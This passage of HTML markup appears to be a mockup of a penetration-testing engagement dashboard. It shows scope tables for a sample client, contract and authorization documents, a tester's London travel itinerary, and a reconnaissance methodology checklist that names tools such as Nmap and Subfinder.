                                                <td>10/11/2024</td>
                                                <td>
                                                    <button class="table-btn" onclick="testScopeItem(this)" style="background: var(--danger); color: white;"> Test</button>
                                                    <button class="table-btn" onclick="editScopeItem(this)"></button>
                                                    <button class="table-btn danger" onclick="deleteScopeItem(this)"></button>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td><span class="asset-type host"> Domain</span></td>
                                                <td><strong>acmecorp.com</strong></td>
                                                <td>Primary corporate domain - includes all subdomains and associated services</td>
                                                <td>10/11/2024</td>
                                                <td>
                                                    <button class="table-btn" onclick="testScopeItem(this)" style="background: var(--danger); color: white;"> Scan</button>
                                                    <button class="table-btn" onclick="editScopeItem(this)"></button>
                                                    <button class="table-btn danger" onclick="deleteScopeItem(this)"></button>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td><span class="asset-type network"> URL</span></td>
                                                <td><strong>https://mail.acmecorp.com</strong></td>
                                                <td>Webmail interface - secondary external target</td>
                                                <td>11/11/2024</td>
                                                <td>
                                                    <button class="table-btn" onclick="testScopeItem(this)" style="background: var(--danger); color: white;"> Test</button>
                                                    <button class="table-btn" onclick="editScopeItem(this)"></button>
                                                    <button class="table-btn danger" onclick="deleteScopeItem(this)"></button>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                            
                            <!-- Internal Segment Card -->
                            <div class="segment-card" data-segment="internal" data-status="active">
                                <div class="segment-card-header">
                                    <div class="segment-info">
                                        <span class="segment-icon"></span>
                                        <div>
                                            <h3 class="segment-title">Internal Network</h3>
                                            <div class="segment-meta">
                                                <span class="status completed">Active</span>
                                                <span class="segment-date">Started: 15/11/2024</span>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="segment-actions">
                                        <button class="action-btn secondary" onclick="addScopeItemToSegment('internal')">+ Add Item</button>
                                        <button class="table-btn" onclick="editSegment(this)" title="Edit"></button>
                                        <button class="table-btn danger" onclick="deleteSegment(this)" title="Delete"></button>
                                    </div>
                                </div>
                                
                                <div class="segment-items-table">
                                    <table class="scope-table">
                                        <thead>
                                            <tr>
                                                <th>Type</th>
                                                <th>Target</th>
                                                <th>Description</th>
                                                <th>Added</th>
                                                <th>Actions</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <tr>
                                                <td><span class="asset-type host"> Host</span></td>
                                                <td><strong>dc01.internal.acmecorp.com</strong></td>
                                                <td>Primary domain controller - critical internal infrastructure component</td>
                                                <td>15/11/2024</td>
                                                <td>
                                                    <button class="table-btn" onclick="testScopeItem(this)" style="background: var(--text-accent); color: white;"> Scan</button>
                                                    <button class="table-btn" onclick="editScopeItem(this)"></button>
                                                    <button class="table-btn danger" onclick="deleteScopeItem(this)"></button>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td><span class="asset-type host"> Host</span></td>
                                                <td><strong>fileserver01.internal.acmecorp.com</strong></td>
                                                <td>Main file server with sensitive document storage</td>
                                                <td>15/11/2024</td>
                                                <td>
                                                    <button class="table-btn" onclick="testScopeItem(this)" style="background: var(--text-accent); color: white;"> Scan</button>
                                                    <button class="table-btn" onclick="editScopeItem(this)"></button>
                                                    <button class="table-btn danger" onclick="deleteScopeItem(this)"></button>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Note: Additional segment cards can be added here for Web App, Cloud, Mobile, etc. -->
                        <!-- Bulk Actions -->
                        <div class="bulk-actions" id="scopeBulkActions" style="display: none;">
                            <div class="bulk-info">
                                <span id="scopeSelectedCount">0</span> items selected
                            </div>
                            <div class="bulk-buttons">
                                <button class="bulk-btn" onclick="bulkTestScopeItems()">Test Selected</button>
                                <button class="bulk-btn danger" onclick="bulkDeleteScopeItems()">Delete Selected</button>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="screen-content" id="documents">
                    <div class="assets-container">
                        <!-- Documents Header -->
                        <div class="assets-header">
                            <div class="assets-summary">
                                <div class="summary-item">
                                    <div class="summary-number">8</div>
                                    <div class="summary-label">Total Documents</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--success);">3</div>
                                    <div class="summary-label">Signed</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--text-accent);">9.6 MB</div>
                                    <div class="summary-label">Total Size</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--warning);">2</div>
                                    <div class="summary-label">This Week</div>
                                </div>
                            </div>
                            
                            <div class="assets-actions">
                                <button class="action-btn secondary" onclick="openModal('secureTransferModal')"> Transfer Link</button>
                                <button class="action-btn primary" onclick="openModal('uploadDocModal')">+ Upload</button>
                            </div>
                        </div>
                        
                        <!-- Documents Filters -->
                        <div class="assets-filters">
                            <div class="filter-section">
                                <label>Category:</label>
                                <div class="filter-group">
                                    <button class="filter-btn active" onclick="filterDocs('all')">All</button>
                                    <button class="filter-btn" onclick="filterDocs('presales')"> Presales</button>
                                    <button class="filter-btn" onclick="filterDocs('authorization')"> Authorization</button>
                                    <button class="filter-btn" onclick="filterDocs('contracts')"> Contracts</button>
                                    <button class="filter-btn" onclick="filterDocs('reports')"> Reports</button>
                                </div>
                            </div>
                            
                            <div class="filter-section">
                                <label>Status:</label>
                                <div class="filter-group">
                                    <button class="filter-btn" onclick="filterDocs('signed')">Signed</button>
                                    <button class="filter-btn" onclick="filterDocs('pending')">Pending</button>
                                    <button class="filter-btn" onclick="filterDocs('draft')">Draft</button>
                                </div>
                            </div>
                            
                            <div class="filter-section">
                                <label>Type:</label>
                                <div class="filter-group">
                                    <button class="filter-btn" onclick="filterDocs('pdf')">PDF</button>
                                    <button class="filter-btn" onclick="filterDocs('docx')">Word</button>
                                    <button class="filter-btn" onclick="filterDocs('xlsx')">Excel</button>
                                </div>
                            </div>
                            
                            <div class="search-section">
                                <input type="text" class="search-input" id="documentsSearch" placeholder="Search documents, descriptions..." onkeyup="searchDocuments()">
                                <button class="search-btn"></button>
                            </div>
                        </div>
                        
                        <!-- Documents Table -->
                        <div class="assets-table-container">
                            <table class="assets-table" id="documentsTable">
                                <thead>
                                    <tr>
                                        <th><input type="checkbox" onchange="toggleSelectAll(this)"></th>
                                        <th onclick="sortDocuments('name')">Document Name <span class="sort-arrow"></span></th>
                                        <th onclick="sortDocuments('category')">Category <span class="sort-arrow"></span></th>
                                        <th onclick="sortDocuments('size')">Size <span class="sort-arrow"></span></th>
                                        <th onclick="sortDocuments('date')">Date <span class="sort-arrow"></span></th>
                                        <th onclick="sortDocuments('status')">Status <span class="sort-arrow"></span></th>
                                        <th>Description</th>
                                        <th>Actions</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="asset-row" data-category="presales" data-type="docx">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>Initial Discovery Notes.docx</strong></td>
                                        <td><span class="asset-type presales"> Presales</span></td>
                                        <td>2.1 MB</td>
                                        <td>12/11/2024</td>
                                        <td><span class="status pending">Draft</span></td>
                                        <td>Client requirements and initial scoping discussion notes</td>
                                        <td>
                                            <button class="table-btn" onclick="downloadDoc('presales-notes')" title="Download"></button>
                                            <button class="table-btn" onclick="shareDoc('presales-notes')" title="Share"></button>
                                            <button class="table-btn" onclick="editDocument(this)" title="Edit"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-category="presales" data-type="pdf">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>Technical Proposal v2.1.pdf</strong></td>
                                        <td><span class="asset-type presales"> Presales</span></td>
                                        <td>1.8 MB</td>
                                        <td>10/11/2024</td>
                                        <td><span class="status completed">Final</span></td>
                                        <td>Final technical proposal with scope and pricing</td>
                                        <td>
                                            <button class="table-btn" onclick="downloadDoc('proposal')" title="Download"></button>
                                            <button class="table-btn" onclick="shareDoc('proposal')" title="Share"></button>
                                            <button class="table-btn" onclick="editDocument(this)" title="Edit"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-category="authorization" data-type="pdf">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>Authorization Letter - SIGNED.pdf</strong></td>
                                        <td><span class="asset-type authorization"> Authorization</span></td>
                                        <td>456 KB</td>
                                        <td>08/11/2024</td>
                                        <td><span class="status completed">Signed</span></td>
                                        <td>Signed authorization letter from client CISO</td>
                                        <td>
                                            <button class="table-btn" onclick="downloadDoc('auth-form')" title="Download"></button>
                                            <button class="table-btn" onclick="shareDoc('auth-form')" title="Share"></button>
                                            <button class="table-btn" onclick="editDocument(this)" title="Edit"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-category="authorization" data-type="pdf">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>Rules of Engagement v1.3.pdf</strong></td>
                                        <td><span class="asset-type authorization"> Authorization</span></td>
                                        <td>325 KB</td>
                                        <td>05/11/2024</td>
                                        <td><span class="status completed">Approved</span></td>
                                        <td>Testing boundaries, restrictions, and emergency contacts</td>
                                        <td>
                                            <button class="table-btn" onclick="downloadDoc('rules-engagement')" title="Download"></button>
                                            <button class="table-btn" onclick="shareDoc('rules-engagement')" title="Share"></button>
                                            <button class="table-btn" onclick="editDocument(this)" title="Edit"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-category="contracts" data-type="pdf">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>Statement of Work - SIGNED.pdf</strong></td>
                                        <td><span class="asset-type contracts"> Contract</span></td>
                                        <td>1.2 MB</td>
                                        <td>28/10/2024</td>
                                        <td><span class="status completed">Signed</span></td>
                                        <td>Executed SOW with deliverables and timeline</td>
                                        <td>
                                            <button class="table-btn" onclick="downloadDoc('sow')" title="Download"></button>
                                            <button class="table-btn" onclick="shareDoc('sow')" title="Share"></button>
                                            <button class="table-btn" onclick="editDocument(this)" title="Edit"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-category="contracts" data-type="pdf">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>Non-Disclosure Agreement.pdf</strong></td>
                                        <td><span class="asset-type contracts"> Contract</span></td>
                                        <td>892 KB</td>
                                        <td>25/10/2024</td>
                                        <td><span class="status completed">Executed</span></td>
                                        <td>Mutual NDA covering confidential information</td>
                                        <td>
                                            <button class="table-btn" onclick="downloadDoc('nda')" title="Download"></button>
                                            <button class="table-btn" onclick="shareDoc('nda')" title="Share"></button>
                                            <button class="table-btn" onclick="editDocument(this)" title="Edit"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-category="reports" data-type="docx">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>Report Template - Acme Corp.docx</strong></td>
                                        <td><span class="asset-type reports"> Reports</span></td>
                                        <td>2.8 MB</td>
                                        <td>20/10/2024</td>
                                        <td><span class="status pending">Template</span></td>
                                        <td>Customized report template with client branding</td>
                                        <td>
                                            <button class="table-btn" onclick="downloadDoc('report-template')" title="Download"></button>
                                            <button class="table-btn" onclick="shareDoc('report-template')" title="Share"></button>
                                            <button class="table-btn" onclick="editDocument(this)" title="Edit"></button>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                        
                        <!-- Mobile Card View -->
                        <div class="assets-mobile-view">
                            <div class="asset-card">
                                <div class="asset-card-header">
                                    <div>
                                        <div class="asset-card-title">Authorization Letter - SIGNED.pdf</div>
                                        <div class="asset-card-subtitle">08/11/2024 - Authorization</div>
                                    </div>
                                    <div class="asset-card-badges">
                                        <span class="status completed">Signed</span>
                                        <span>456 KB</span>
                                    </div>
                                </div>
                                <div class="asset-card-actions">
                                    <button class="table-btn"> Download</button>
                                    <button class="table-btn"> Share</button>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Bulk Actions -->
                        <div class="bulk-actions" id="documentsBulkActions" style="display: none;">
                            <div class="bulk-info">
                                <span id="documentsSelectedCount">0</span> documents selected
                            </div>
                            <div class="bulk-buttons">
                                <button class="bulk-btn" onclick="bulkDownloadDocs()">Download Selected</button>
                                <button class="bulk-btn" onclick="bulkShareDocs()">Share Selected</button>
                                <button class="bulk-btn danger" onclick="bulkDeleteDocs()">Delete Selected</button>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="screen-content" id="travel">
                    <div class="assets-container">
                        <!-- Travel Header -->
                        <div class="assets-header">
                            <div class="assets-summary">
                                <div class="summary-item">
                                    <div class="summary-number">3</div>
                                    <div class="summary-label">Active Trips</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--warning);">2</div>
                                    <div class="summary-label">Upcoming</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--success);">1,245</div>
                                    <div class="summary-label">Total Budget</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--text-accent);">5</div>
                                    <div class="summary-label">Bookings Made</div>
                                </div>
                            </div>
                            
                            <div class="assets-actions">
                                <button class="action-btn secondary" onclick="exportItinerary()"> Export Itinerary</button>
                                <button class="action-btn secondary" onclick="openModal('travelTemplatesModal')"> Templates</button>
                                <button class="action-btn primary" onclick="openModal('newTripModal')">+ New Trip</button>
                            </div>
                        </div>

                        <!-- Quick Actions Bar -->
                        <div class="assets-filters" style="background: var(--bg-accent); border: 1px solid var(--border-accent); margin-bottom: 1.5rem;">
                            <div style="display: flex; gap: 1rem; flex-wrap: wrap;">
                                <button class="filter-btn" onclick="showTravelSection('overview')" style="background: var(--button-primary); color: white;"> Overview</button>
                                <button class="filter-btn" onclick="showTravelSection('journeys')"> Journeys</button>
                                <button class="filter-btn" onclick="showTravelSection('hotels')"> Hotels</button>
                                <button class="filter-btn" onclick="showTravelSection('expenses')"> Expenses</button>
                                <button class="filter-btn" onclick="showTravelSection('documents')"> Documents</button>
                            </div>
                        </div>

                        <!-- Current/Next Trip Card -->
                        <div class="asset-card" style="background: linear-gradient(135deg, var(--bg-accent), var(--bg-secondary)); border: 2px solid var(--button-primary); margin-bottom: 1.5rem;">
                            <div class="asset-card-header" style="padding: 1.5rem;">
                                <div style="flex: 1;">
                                    <h3 style="color: var(--text-primary); margin-bottom: 0.5rem;"> Current Engagement: The Shard, London</h3>
                                    <div style="display: flex; gap: 2rem; flex-wrap: wrap; margin-top: 1rem;">
                                        <div>
                                            <span style="color: var(--text-secondary); font-size: 0.875rem;">Target Location:</span>
                                            <div style="font-weight: 600;">The Shard, 32 London Bridge St, London SE1 9SG</div>
                                        </div>
                                        <div>
                                            <span style="color: var(--text-secondary); font-size: 0.875rem;">Hotel:</span>
                                            <div style="font-weight: 600;">Premier Inn London County Hall</div>
                                        </div>
                                        <div>
                                            <span style="color: var(--text-secondary); font-size: 0.875rem;">Dates:</span>
                                            <div style="font-weight: 600;">18-22 Nov 2024</div>
                                        </div>
                                    </div>
                                </div>
                                <button class="action-btn primary" onclick="viewFullItinerary()">View Full Itinerary</button>
                            </div>
                        </div>

                        <!-- Journey Timeline -->
                        <div class="section-container" id="travelOverview">
                            <h3 style="margin-bottom: 1.5rem; color: var(--text-primary);"> Journey Timeline</h3>
                            
                            <!-- Outbound Journey -->
                            <div class="timeline-container" style="margin-bottom: 2rem;">
                                <h4 style="color: var(--text-accent); margin-bottom: 1rem;"> Outbound - Monday, 18 Nov 2024</h4>
                                
                                <div class="journey-segment" style="display: flex; align-items: center; gap: 1rem; padding: 1rem; background: var(--bg-secondary); border-radius: 8px; margin-bottom: 0.75rem;">
                                    <div class="segment-icon" style="font-size: 1.5rem;"></div>
                                    <div style="flex: 1;">
                                        <div style="font-weight: 600;">Uber to Manchester Piccadilly</div>
                                        <div style="color: var(--text-secondary); font-size: 0.875rem;">07:30 - Home to Station</div>
                                    </div>
                                    <div style="text-align: right;">
                                        <div style="font-weight: 600; color: var(--success);">15</div>
                                        <span class="tag confirmed" style="font-size: 0.75rem;">Booked</span>
                                    </div>
                                </div>

                                <div class="journey-connector" style="margin-left: 1.5rem; height: 20px; border-left: 2px dashed var(--border);"></div>

                                <div class="journey-segment" style="display: flex; align-items: center; gap: 1rem; padding: 1rem; background: var(--bg-secondary); border-radius: 8px; margin-bottom: 0.75rem;">
                                    <div class="segment-icon" style="font-size: 1.5rem;"></div>
                                    <div style="flex: 1;">
                                        <div style="font-weight: 600;">Virgin Trains - Manchester to London Euston</div>
                                        <div style="color: var(--text-secondary); font-size: 0.875rem;">08:15 - 10:25 | Platform 13 | Coach B, Seat 12A</div>
                                        <div style="margin-top: 0.25rem;">
                                            <span class="tag" style="background: var(--bg-accent); font-size: 0.75rem;">First Class</span>
                                            <span class="tag" style="background: var(--warning); color: white; font-size: 0.75rem;">Ref: VT284729</span>
                                        </div>
                                    </div>
                                    <div style="text-align: right;">
                                        <div style="font-weight: 600; color: var(--success);">125.50</div>
                                        <span class="tag confirmed" style="font-size: 0.75rem;">Confirmed</span>
                                    </div>
                                </div>

                                <div class="journey-connector" style="margin-left: 1.5rem; height: 20px; border-left: 2px dashed var(--border);"></div>

                                <div class="journey-segment" style="display: flex; align-items: center; gap: 1rem; padding: 1rem; background: var(--bg-secondary); border-radius: 8px; margin-bottom: 0.75rem;">
                                    <div class="segment-icon" style="font-size: 1.5rem;"></div>
                                    <div style="flex: 1;">
                                        <div style="font-weight: 600;">London Underground - Northern Line</div>
                                        <div style="color: var(--text-secondary); font-size: 0.875rem;">10:45 - Euston to London Bridge (6 stops)</div>
                                    </div>
                                    <div style="text-align: right;">
                                        <div style="font-weight: 600; color: var(--success);">2.80</div>
                                        <span class="tag" style="font-size: 0.75rem;">Oyster Card</span>
                                    </div>
                                </div>

                                <div class="journey-connector" style="margin-left: 1.5rem; height: 20px; border-left: 2px dashed var(--border);"></div>

                                <div class="journey-segment" style="display: flex; align-items: center; gap: 1rem; padding: 1rem; background: var(--bg-secondary); border-radius: 8px;">
                                    <div class="segment-icon" style="font-size: 1.5rem;"></div>
                                    <div style="flex: 1;">
                                        <div style="font-weight: 600;">Premier Inn London County Hall</div>
                                        <div style="color: var(--text-secondary); font-size: 0.875rem;">Check-in from 14:00 | Belvedere Rd, London SE1 7PB</div>
                                        <div style="margin-top: 0.25rem;">
                                            <span class="tag" style="background: var(--bg-accent); font-size: 0.75rem;">5 min walk to Westminster</span>
                                        </div>
                                    </div>
                                    <div style="text-align: right;">
                                        <div style="font-weight: 600; color: var(--success);">89/night</div>
                                        <span class="tag confirmed" style="font-size: 0.75rem;">Ref: PI847293</span>
                                    </div>
                                </div>
                            </div>

                            <!-- Daily Commute -->
                            <div class="timeline-container" style="margin-bottom: 2rem;">
                                <h4 style="color: var(--text-accent); margin-bottom: 1rem;"> Daily Commute to Site</h4>
                                
                                <div class="journey-segment" style="display: flex; align-items: center; gap: 1rem; padding: 1rem; background: var(--bg-secondary); border-radius: 8px; margin-bottom: 0.75rem;">
                                    <div class="segment-icon" style="font-size: 1.5rem;"></div>
                                    <div style="flex: 1;">
                                        <div style="font-weight: 600;">Morning Route: Hotel to The Shard</div>
                                        <div style="color: var(--text-secondary); font-size: 0.875rem;">08:30 Daily - Westminster to London Bridge</div>
                                        <div style="margin-top: 0.5rem; padding: 0.5rem; background: var(--bg-primary); border-radius: 4px;">
                                            <strong>Option 1:</strong>  Jubilee Line (1 stop, 2 mins) - 2.80<br>
                                            <strong>Option 2:</strong>  Walk via Thames Path (15 mins) - Free<br>
                                            <strong>Option 3:</strong>  Uber/Taxi (5 mins) - ~8-12
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <!-- Return Journey -->
                            <div class="timeline-container">
                                <h4 style="color: var(--text-accent); margin-bottom: 1rem;"> Return - Friday, 22 Nov 2024</h4>
                                
                                <div class="journey-segment" style="display: flex; align-items: center; gap: 1rem; padding: 1rem; background: var(--bg-secondary); border-radius: 8px; margin-bottom: 0.75rem;">
                                    <div class="segment-icon" style="font-size: 1.5rem;"></div>
                                    <div style="flex: 1;">
                                        <div style="font-weight: 600;">Hotel Check-out</div>
                                        <div style="color: var(--text-secondary); font-size: 0.875rem;">By 11:00 - Store luggage at reception if needed</div>
                                    </div>
                                </div>

                                <div class="journey-connector" style="margin-left: 1.5rem; height: 20px; border-left: 2px dashed var(--border);"></div>

                                <div class="journey-segment" style="display: flex; align-items: center; gap: 1rem; padding: 1rem; background: var(--bg-secondary); border-radius: 8px; margin-bottom: 0.75rem;">
                                    <div class="segment-icon" style="font-size: 1.5rem;"></div>
                                    <div style="flex: 1;">
                                        <div style="font-weight: 600;">London Underground to Euston</div>
                                        <div style="color: var(--text-secondary); font-size: 0.875rem;">16:30 - Westminster to Euston (Northern Line)</div>
                                    </div>
                                    <div style="text-align: right;">
                                        <div style="font-weight: 600; color: var(--success);">2.80</div>
                                    </div>
                                </div>

                                <div class="journey-connector" style="margin-left: 1.5rem; height: 20px; border-left: 2px dashed var(--border);"></div>

                                <div class="journey-segment" style="display: flex; align-items: center; gap: 1rem; padding: 1rem; background: var(--bg-secondary); border-radius: 8px;">
                                    <div class="segment-icon" style="font-size: 1.5rem;"></div>
                                    <div style="flex: 1;">
                                        <div style="font-weight: 600;">Avanti West Coast - London to Manchester</div>
                                        <div style="color: var(--text-secondary); font-size: 0.875rem;">17:30 - 19:47 | Platform TBC | Coach F, Seat 22C</div>
                                        <div style="margin-top: 0.25rem;">
                                            <span class="tag" style="background: var(--warning); color: white; font-size: 0.75rem;">Ref: AWC938475</span>
                                        </div>
                                    </div>
                                    <div style="text-align: right;">
                                        <div style="font-weight: 600; color: var(--success);">87.00</div>
                                        <span class="tag confirmed" style="font-size: 0.75rem;">Confirmed</span>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Important Information Cards -->
                        <div class="assets-filters" style="background: var(--bg-warning); border: 1px solid var(--warning); margin-top: 2rem;">
                            <h4 style="color: var(--warning); margin-bottom: 1rem;"> Important Travel Information</h4>
                            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1rem;">
                                <div>
                                    <strong>Client Site Access:</strong>
                                    <div style="font-size: 0.875rem; margin-top: 0.25rem;">Reception at Level 2, bring photo ID and authorization letter</div>
                                </div>
                                <div>
                                    <strong>Emergency Contact:</strong>
                                    <div style="font-size: 0.875rem; margin-top: 0.25rem;">Project Manager: +44 7700 900123</div>
                                </div>
                                <div>
                                    <strong>WiFi at Hotel:</strong>
                                    <div style="font-size: 0.875rem; margin-top: 0.25rem;">Network: PremierInn_WiFi | Password: In room card</div>
                                </div>
                                <div>
                                    <strong>Expense Policy:</strong>
                                    <div style="font-size: 0.875rem; margin-top: 0.25rem;">Keep all receipts, 30/day meal allowance</div>
                                </div>
                            </div>
                        </div>

                        <!-- Travel Documents Section -->
                        <div class="section-container" style="margin-top: 2rem;">
                            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
                                <h3 style="color: var(--text-primary);"> Travel Documents</h3>
                                <button class="action-btn secondary" onclick="uploadDocument()"> Upload Document</button>
                            </div>
                            
                            <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 1rem;">
                                <div class="asset-card" style="cursor: pointer; padding: 1rem;">
                                    <div style="font-size: 2rem; margin-bottom: 0.5rem;"></div>
                                    <div style="font-weight: 600;">Train Tickets</div>
                                    <div style="font-size: 0.75rem; color: var(--text-secondary);">VT284729.pdf</div>
                                </div>
                                <div class="asset-card" style="cursor: pointer; padding: 1rem;">
                                    <div style="font-size: 2rem; margin-bottom: 0.5rem;"></div>
                                    <div style="font-weight: 600;">Hotel Booking</div>
                                    <div style="font-size: 0.75rem; color: var(--text-secondary);">PI847293.pdf</div>
                                </div>
                                <div class="asset-card" style="cursor: pointer; padding: 1rem;">
                                    <div style="font-size: 2rem; margin-bottom: 0.5rem;"></div>
                                    <div style="font-weight: 600;">Authorization Letter</div>
                                    <div style="font-size: 0.75rem; color: var(--text-secondary);">Auth_Shard_2024.pdf</div>
                                </div>
                                <div class="asset-card" style="cursor: pointer; padding: 1rem;">
                                    <div style="font-size: 2rem; margin-bottom: 0.5rem;"></div>
                                    <div style="font-weight: 600;">Site Map</div>
                                    <div style="font-size: 0.75rem; color: var(--text-secondary);">Shard_Floor_Plan.pdf</div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="screen-content" id="methodology">
                    <div class="screen-header">
                        <div class="header-content">
                            <h2 class="screen-title"> Testing Methodology</h2>
                            <p class="screen-subtitle">Define and track testing procedures and actions</p>
                        </div>
                        <div class="header-actions">
                            <button class="action-btn primary" onclick="addNewAction()">
                                <span></span> Add Action
                            </button>
                            <button class="action-btn secondary" onclick="importMethodology()">
                                <span></span> Import Template
                            </button>
                        </div>
                    </div>

                    <!-- Methodology Stats -->
                    <div class="methodology-stats">
                        <div class="stat-card">
                            <div class="stat-number">24</div>
                            <div class="stat-label">Total Actions</div>
                            <div class="stat-sublabel">Planned</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-number">8</div>
                            <div class="stat-label">In Progress</div>
                            <div class="stat-sublabel">Active</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-number">12</div>
                            <div class="stat-label">Completed</div>
                            <div class="stat-sublabel">Finished</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-number">4</div>
                            <div class="stat-label">Pending</div>
                            <div class="stat-sublabel">Not Started</div>
                        </div>
                    </div>

                    <!-- Filters and Search -->
                    <div class="methodology-controls">
                        <div class="filter-controls">
                            <div class="filter-section">
                                <label>Category:</label>
                                <div class="filter-group">
                                    <button class="filter-btn active" onclick="filterActions('all')">All</button>
                                    <button class="filter-btn" onclick="filterActions('reconnaissance')"> Reconnaissance</button>
                                    <button class="filter-btn" onclick="filterActions('scanning')"> Scanning</button>
                                    <button class="filter-btn" onclick="filterActions('enumeration')"> Enumeration</button>
                                    <button class="filter-btn" onclick="filterActions('exploitation')"> Exploitation</button>
                                    <button class="filter-btn" onclick="filterActions('post-exploitation')"> Post-Exploitation</button>
                                </div>
                            </div>
                            
                            <div class="filter-section">
                                <label>Status:</label>
                                <div class="filter-group">
                                    <button class="filter-btn" onclick="filterActions('pending')">Pending</button>
                                    <button class="filter-btn" onclick="filterActions('in-progress')">In Progress</button>
                                    <button class="filter-btn" onclick="filterActions('completed')">Completed</button>
                                    <button class="filter-btn" onclick="filterActions('blocked')">Blocked</button>
                                </div>
                            </div>
                            
                            <div class="search-section">
                                <input type="text" class="search-input" id="actionSearch" placeholder="Search actions, tools, descriptions..." onkeyup="searchActions()">
                                <button class="search-btn"></button>
                            </div>
                        </div>
                    </div>

                    <!-- Actions List -->
                    <div class="methodology-content">
                        <!-- Reconnaissance Phase -->
                        <div class="methodology-phase" data-phase="reconnaissance">
                            <div class="phase-header">
                                <h3 class="phase-title"> Reconnaissance</h3>
                                <div class="phase-progress">
                                    <span class="progress-text">3/6 Complete</span>
                                    <div class="progress-bar">
                                        <div class="progress-fill" style="width: 50%"></div>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="actions-grid">
                                <div class="action-item" data-status="completed" data-category="reconnaissance" onclick="openActionModal('osint-gathering')">
                                    <div class="action-header">
                                        <div class="action-status completed"></div>
                                        <div class="action-info">
                                            <h4 class="action-title">OSINT Gathering</h4>
                                            <p class="action-description">Collect publicly available information about the target organization</p>
                                        </div>
                                        <div class="action-meta">
                                            <span class="action-tool"> Manual + Tools</span>
                                            <span class="action-time">2h</span>
                                        </div>
                                    </div>
                                    <div class="action-details">
                                        <div class="action-techniques">
                                            <span class="technique-tag">Google Dorking</span>
                                            <span class="technique-tag">Social Media Analysis</span>
                                            <span class="technique-tag">DNS Enumeration</span>
                                        </div>
                                        <div class="action-findings">
                                            <span class="findings-badge success">3 findings</span>
                                        </div>
                                    </div>
                                </div>

                                <div class="action-item" data-status="completed" data-category="reconnaissance" onclick="openActionModal('subdomain-enumeration')">
                                    <div class="action-header">
                                        <div class="action-status completed"></div>
                                        <div class="action-info">
                                            <h4 class="action-title">Subdomain Enumeration</h4>
                                            <p class="action-description">Discover subdomains and related infrastructure</p>
                                        </div>
                                        <div class="action-meta">
                                            <span class="action-tool"> Subfinder</span>
                                            <span class="action-time">1h</span>
                                        </div>
                                    </div>
                                    <div class="action-details">
                                        <div class="action-techniques">
                                            <span class="technique-tag">DNS Brute Force</span>
                                            <span class="technique-tag">Certificate Transparency</span>
                                        </div>
                                        <div class="action-findings">
                                            <span class="findings-badge success">15 subdomains</span>
                                        </div>
                                    </div>
                                </div>

                                <div class="action-item" data-status="in-progress" data-category="reconnaissance" onclick="openActionModal('port-scanning')">
                                    <div class="action-header">
                                        <div class="action-status in-progress"></div>
                                        <div class="action-info">
                                            <h4 class="action-title">Port Scanning</h4>
                                            <p class="action-description">Identify open ports and services on discovered hosts</p>
                                        </div>
                                        <div class="action-meta">
                                            <span class="action-tool"> Nmap</span>
                                            <span class="action-time">3h</span>
                                        </div>
                                    </div>
                                    <div class="action-details">
                                        <div class="action-techniques">
                                            <span class="technique-tag">TCP SYN Scan</span>
                                            <span class="technique-tag">Service Version Detection</span>
                                            <span class="technique-tag">OS Fingerprinting</span>
                                        </div>
                                        <div class="action-progress-bar">
                                            <div class="progress-fill" style="width: 65%"></div>
                                        </div>
                                    </div>
                                </div>

                                <div class="action-item" data-status="pending" data-category="reconnaissance" onclick="openActionModal('technology-stack')">
                                    <div class="action-header">
                                        <div class="action-status pending"></div>
                                        <div class="action-info">
                                            <h4 class="action-title">Technology Stack Analysis</h4>
                                            <p class="action-description">Identify technologies, frameworks, and versions in use</p>
                                        </div>
                                        <div class="action-meta">
                                            <span class="action-tool"> Wappalyzer</span>
                                            <span class="action-time">1.5h</span>
                                        </div>
                                    </div>
                                    <div class="action-details">
                                        <div class="action-techniques">
                                            <span class="technique-tag">Header Analysis</span>
                                            <span class="technique-tag">Framework Detection</span>
                                        </div>
                                    </div>
                                </div>

